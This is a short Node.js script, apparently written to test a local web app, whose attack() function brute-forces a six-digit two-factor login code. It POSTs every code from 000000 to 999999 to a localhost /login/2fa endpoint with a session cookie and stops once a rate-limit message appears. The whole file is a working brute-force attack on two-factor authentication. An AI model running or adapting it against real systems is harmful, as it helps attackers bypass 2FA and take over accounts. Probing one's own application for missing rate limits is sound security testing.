import fetch from 'node-fetch'

const URL = 'http://localhost:3000/login/2fa'

const COOKIE = 'connect.sid=sid'

async function attack() {
  for (let i = 0; i <= 999999; i++) {
    const code = i.toString().padStart(6, '0')

    const res = await fetch(URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        Cookie: COOKIE,
      },
      body: `token=${code}`,
    })

    const text = await res.text()

    console.log(code, text)

    if (text.includes('Too many attempts')) {
      console.log('🔥 RATE LIMIT TRIGGERED')
      break
    }
  }
}

attack()
